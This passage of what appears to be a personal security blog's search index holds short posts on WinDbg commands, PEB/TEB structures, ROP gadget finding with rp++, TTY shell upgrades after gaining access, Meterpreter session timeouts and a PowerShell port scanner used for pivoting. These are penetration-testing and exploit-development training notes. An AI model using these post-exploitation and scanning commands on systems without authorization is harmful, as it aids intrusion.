at once\n.formats 41414141 // converts 41414141 to all formats Pseudo Registers #windbg has a series of pseudo registers, there are variables pre-defined.\nExample of pseudo registers are $teb contains address of TEB, $t0â€¦$t19 used for mathematical calculation\nWhen using pseudo registers or registers its recommend to prefix them @ character, example @$teb this tells windbg to treat the content as a register or pseudo registers. It speeds the evaluation process because windbg won\u0026rsquo;t try to resolve it as symbols first.\nr @$t0 = (41414141 - 414141) * 0n10 // store the result into pseudo register r @$t0 // display the result ? @$t0 \u0026gt;\u0026gt; 8 // right shift the result to 8 bits Check memory permission #We can check memory permission under Protect field.\n!vprot esp !vprot eip !vprot 00d13000 List stack frame #Using the k command to list the stack frame\nk k2 k3 k4 ","date":"19 March 2024","permalink":"/posts/postsec/windbg_usful_cmds/","section":"Posts","summary":"All windbg commands here #Link to windgb manual","title":"Windbg useful commands"},{"content":"This technique address the need to launch windbg with high privilege to debug processes running with system account privilege.\nYou can run windbg as normal user because we are running via cdb and cdb is running as system privilege.\nCreate a service for the process you want to debug,\nsc.exe create AppServiceDebug binpath= \u0026#34;C:\\Program Files\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe -server tcp:port=50000 C:\\Program Files\\APP\\Debug\\app.exe\u0026#34; Go to windows services, you can run services.msc to open the windows services. Make sure process will run as System Account.\nAfter starting the service, you can open windbg and choose attach to remote process and enter the information below.\nWindbg Connect String Connection string\ntcp:port=50000 Tips #You have to quickly let windbg to continue with \u0026ldquo;g\u0026rdquo; for the service not to die. To start the service again after crash you need to kill the cdb.exe process and windbg.exe so you donâ€™t need to do it manually.\nExample of command\ntaskkill /F /IM cdb.exe \u0026amp;\u0026amp; taskkill /F /IM windbg.exe ","date":"10 March 2024","permalink":"/posts/postsec/windbg_cdb_attach/","section":"Posts","summary":"This technique address the need to launch windbg with high privilege to debug processes running with system account privilege.","title":"Windbg, the cdb.exe to attach to process  "},{"content":"You can find the Import Address Table of an application and the list of imported functions by attaching Windbg to the process and following the steps below.\nFind the module in windbg #lm Dump the header of the module #!dh \u0026lt;module_address\u0026gt; -f The result of !df look for Import Address Table Directory which will contain the offset vaule and the size.\nUse the IAT offset and size of IAT as follow to list the imported functions #dps \u0026lt;module_address\u0026gt;+\u0026lt;IAT_offset_address\u0026gt; \u0026lt;module_address\u0026gt;+\u0026lt;IAT_offset_address\u0026gt;+\u0026lt;sizeof_IAT\u0026gt; Reference: tom\u0026rsquo;s reversing viewing imports\n","date":"10 March 2024","permalink":"/posts/postsec/windbg_iat/","section":"Posts","summary":"You can find the Import Address Table of an application and the list of imported functions by attaching Windbg to the process and following the steps below.","title":"Find IAT using Windbg"},{"content":"","date":null,"permalink":"/tags/kali/","section":"Tags","summary":"","title":"Kali"},{"content":"","date":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux"},{"content":"My notes on some of useful tty commands #Color when listing files #export TERM=xterm-256-color alias ll=\u0026#39;ls -lsahta --color=auto\u0026#39; Run: ll Get interactive shell zsh shell // new kalli version working #python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo; fg enter export TERM=xterm-256color export SHELL=bash export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp stty rows X columns Y // get rows and columns info: stty -a Get interactive shell fully working (old version kali, not using zsh). #ps -p $$ // check which if you are using bash, new version of kali uses zsh shells, it wont work. exec bash --login // if command above returned zsh, change to bash. After using one of the methods, run below for tty #crtz+z // on your keyboard run: stty raw -echo // kali , if you run under zsh run on one line: stty raw -echo; fg run: fg // kali hit enter // target export TERM=xterm // target export SHELL=bash export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp stty rows X columns Y // get rows and columns info: stty -a fix terminal exiting from the shell #reset tty that work most of the time #/usr/bin/script -qc /bin/bash /dev/null /usr/bin/script -qc /bin/sh /dev/null Python2 tty #The sh shell version\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; The bash shell version\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python3 tty #python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ","date":"10 March 2024","permalink":"/posts/postsec/tty_shell/","section":"Posts","summary":"My notes on some of useful tty commands #Color when listing files #export TERM=xterm-256-color alias ll=\u0026#39;ls -lsahta --color=auto\u0026#39; Run: ll Get interactive shell zsh shell // new kalli version working #python3 -c \u0026#39;import pty; pty.","title":"TTY shells"},{"content":"Narly is a plugin that parses the image and identifies the binary protections mechanisms enabled such as DEP, ASLR, SafeSEH and GS.\nVery useful during exploit development.\nCan be downloaded here narly\nHow to use #Note.: after narly is compiled copy the narly.dll in windbg winext directory.\nExample:\nC:\\Program Files\\Debugging Tools for Windows (x86)\\winext Loading the plugin:\n.load narly Running narly in windbg:\n!nmod ","date":"9 March 2024","permalink":"/posts/postsec/narly_windbg/","section":"Posts","summary":"Narly is a plugin that parses the image and identifies the binary protections mechanisms enabled such as DEP, ASLR, SafeSEH and GS.","title":"Narly plugin for windbg"},{"content":"The Import Address Table stores information about the loaded modules imported by the current running processs.\nThe IAT is important during reverse engineering process to identify functions been used by the application and therefore understand better the application functionality and capabilities, its possible to understand the application behaviour by reviewing the IAT and looking for functions commonly used by malware.\nExploit developer perspective the IAT is important to identiy weak/vulnerable functions used by the application, after idenfiying the vulnerable function the exploit developer will attempt to reach the vulnerable function by manipulating the network packet or file format.\nBelow is an example of dependecy walker loaded with notepad.exe. We can see functions and modules used by notepad.exe We can see the notepad.exe uses kernel32 module and kernelbase as well and multiple functions from these modules.\nDependecy Walker Thank you for reading.\n","date":"9 March 2024","permalink":"/posts/postsec/iat_win/","section":"Posts","summary":"The Import Address Table stores information about the loaded modules imported by the current running processs.","title":"The IAT (Import Address Table)"},{"content":"The rp++ is a ROP Gadget finder used by Exploit Developers to bypass DEP protection.\nOficial link rp++\nYou will need to compile.\nHow to use #Note.: -r means how many assembly instructions, -f the path to the .dll or .exe to extract the gadgets and \u0026gt; to re-direct the results to a file. You can also exclude bad chars with bad chars.\nrp++.exe -r 5 -f \u0026lt;some.dll\u0026gt; \u0026gt; rop_some.dll with new version you can exclude bad characters\nrp++.exe --bad-bytes \u0026#39;\\x00\\x0a\u0026#39; -r 5 -f \u0026lt;some.dll\u0026gt; \u0026gt; rop_some.dll ","date":"9 March 2024","permalink":"/posts/postsec/rp_gadget/","section":"Posts","summary":"The rp++ is a ROP Gadget finder used by Exploit Developers to bypass DEP protection.","title":"The RP++ ROP Finder"},{"content":"The TEB (Thread Environment Block) #Just as PEB contains information about the processs, the TEB has information about the thread running in the processs. A process when created contains at least one thread that execute the desired code, a process can create N Threads.\nEach thread has its own TEB structure, the TEB is often used by exploit developers and malware developers to locate the Pointer to the PEB structure or information about running thread.\nThe TEB is accessed through FS segment register on 32-bit and GS on 64-bit Windows.\ntypedef struct _TEB { PVOID Reserved1[12]; PPEB ProcessEnvironmentBlock; PVOID Reserved2[399]; BYTE Reserved3[1952]; PVOID TlsSlots[64]; BYTE Reserved4[8]; PVOID Reserved5[26]; PVOID ReservedForOle; PVOID Reserved6[4]; PVOID TlsExpansionSlots; } TEB, *PTEB; References: TEB Microsoft TEB Wikipedia\n","date":"9 March 2024","permalink":"/posts/postsec/teb_struct/","section":"Posts","summary":"The TEB (Thread Environment Block) #Just as PEB contains information about the processs, the TEB has information about the thread running in the processs.","title":"The TEB Structure"},{"content":"The PEB (Process Environment Block) #The PEB is a data structure that store information about the running process and can be accessed through intel x86 [FS] register at offset 0x30h.\nThe structure contains useful information such as loaded modules on the running process commonly used during shellcode devolpment to resolve Win32 APIs functions.\nAnother useful information in the PEB structure is BeingDebugged that shows if the running process is been attached to the debugger or not.\nThis feature is often used by malware developers as an anti-debugging technique to increase the difficult of defenders such as Malware Analysts to analyse the malware dynamically using a debugger.\nIf the malware detects that is been debugged the malware could act as completed different to hide true purpose from analysts or delete itself on disk.\nThe Ldr data structure is also important which I will explain later on.\ntypedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId; } PEB, *PPEB; Reference: Microsoft API PEB Reference\n","date":"9 March 2024","permalink":"/posts/postsec/peb/","section":"Posts","summary":"The PEB (Process Environment Block) #The PEB is a data structure that store information about the running process and can be accessed through intel x86 [FS] register at offset 0x30h.","title":"The PEB Structure"},{"content":"","date":null,"permalink":"/tags/metasploit/","section":"Tags","summary":"","title":"MetaSploit"},{"content":"","date":null,"permalink":"/tags/meterpreter/","section":"Tags","summary":"","title":"Meterpreter"},{"content":"A year ago while testing a https reverse meterpreter shell after a 15 or 30 minutes the meterpreter session would die. After investigating I ensured my reverse payload was not been dectected by the anti-virus, but the issue persisted\nI tried the TCP Meterpreter Shell and that resolved the issue, could be the related to network conditions affecting the HTTPS connection as a result the payload wasn\u0026rsquo;t a good fit for that environment\nLeason learned if a specific payload doesn\u0026rsquo;t work, try a different one\nBut this issue lead me to further investigate and see what could be on my control to improve the connection and I found I could set the following parameters for the meterpreter sessions\nComm Timeout (Communication timeout) Retry Total Time Retry Wait Time You will have to experiment with the values until you reach the one that best suitable for the network environment I recommend to use Only if you already have attempted to change payloads and you still have issues\nThe command # set_timeouts -x 0 -c 100000 -w 2500 -t 100000 Flag and meaning # The -x stands for Expiration Timeout The -c stands for Communication Timeout The -w stands for Retry Wait Time the -t stands for Retry Total Time To view the results of newly configured settings run the following command # get_timeouts Reference: Metasploit Timeout control\n","date":"2 March 2024","permalink":"/posts/postsec/meterpreter_shell_timeout/","section":"Posts","summary":"A year ago while testing a https reverse meterpreter shell after a 15 or 30 minutes the meterpreter session would die.","title":"Meterpreter Session Time out"},{"content":"While training Red Teaming or Penetration Test hacking on plataforms like Hack the Box or previous offensive security training like OSCP or OSEP\nOne thing I noticed is during lateral movement through pivoting between the machines if I had to perform port scan enumeration on hosts located on different subnet/network utilizing proxychain+nmap or chisel+nmap, that was very painful and a nightmare\nNmap + Proxychains or Nmap + chisel did not work very well for me and for that reason i came up with something different and that was to leverage what native powershell has to offer, but for the offensive security side of it\nIf you have to scan large amount of ports even twerking the settings in nmap and proxychains will not give much gains compared to powershell. Below is a small snipped of powershell code that I developed and used multiple times during my training days that helped me and saved me a lot of time\nMy personal opnion on powershell is an awesome tool and one should master and be used as Read Teamer or Penetration Tester\nPowershell Port Scan Code #I used Runspace feature in powershell that allows to run multiple commands by creating new threads on existing process. The CreateRunSpacePool values 1,100 means mininum and maximum number of threads allowed to run at the same time. The AddScript is where you add the desired code to run\n$RunspacePool = [runspacefactory]::CreateRunspacePool(1,100) $RunspacePool.Open() $PowerShell = [powershell]::Create() $PowerShell.RunspacePool = $RunspacePool $PowerShell.AddScript({1..65535 | ForEach-Object { if((New-Object System.Net.Sockets.TcpClient).ConnectAsync(\u0026#34;YOUR_IP_HERE\u0026#34;,$_).wait(100)){write-host \u0026#34;Port $_ is opened\u0026#34;}}}) $Jobs = $PowerShell.BeginInvoke() If you want to go beyond you can improve the code snippet to run on multiple ips or creating a script that accept IP as an argument\n","date":"2 March 2024","permalink":"/posts/postsec/powershellscan/","section":"Posts","summary":"While training Red Teaming or Penetration Test hacking on plataforms like Hack the Box or previous offensive security training like OSCP or OSEP","title":"Powershell Port Scan"},{"content":"","date":null,"permalink":"/tags/programming/","section":"Tags","summary":"","title":"Programming"}]